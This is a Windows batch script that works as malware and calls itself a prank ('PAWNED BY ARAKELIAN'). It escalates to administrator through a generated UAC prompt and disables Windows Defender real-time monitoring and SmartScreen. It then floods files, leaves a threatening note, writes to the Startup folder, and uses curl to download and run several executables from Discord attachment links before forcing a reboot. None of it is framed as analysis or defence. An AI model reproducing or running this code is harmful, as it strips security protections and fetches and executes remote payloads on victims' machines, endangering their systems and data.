@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------
powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $true"
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScreenEnabled" /t "REG_SZ" /d "Off" /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v "SmartScreenEnabled" /t "REG_SZ" /d "Off" /f
set loop1=0
:loop1
echo PAWNED BY ARAKELIAN :) > ARAKED[%random%].txt
set /a loop1=%loop1%+1 
if "%loop1%"=="60" goto 2
goto loop1

:2
cd %temp%
echo YOUR COMPUTER IS PAWNED BY ARAKELIAN... IF YOU RESTART YOUR COMPUTER IS DEAD :) > NOTE_araked.txt
start NOTE_araked.txt
cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
echo pranked > hehehe[%random%].txt
cd %temp%
curl https://cdn.discordapp.com/attachments/951496409318817872/967582484843888640/clippy.exe -O
start clippy.exe
goto 2.5

:2.5
timeout 10
goto 3

:3
cd %temp%
curl https://cdn.discordapp.com/attachments/951496409318817872/967598739739013120/EndermanchDesktopBoom.exe -O
start EndermanchDesktopBoom.exe
goto 4

:4
cd %temp%
curl https://cdn.discordapp.com/attachments/951496409318817872/967591069594320896/EndermanchScreenScrew.exe -O
start EndermanchScreenScrew.exe
goto 5

:5
cd %temp%
curl https://cdn.discordapp.com/attachments/951496409318817872/967595207208083496/EndermanchHydra.exe -O
start EndermanchHydra.exe
goto 6

:6
cd %temp%
curl https://cdn.discordapp.com/attachments/951496409318817872/967574561547776000/Zer0Mem0ryMelting.exe -O
start Zer0Mem0ryMelting.exe
timeout 60
shutdown /r
goto exit


:exit
exit
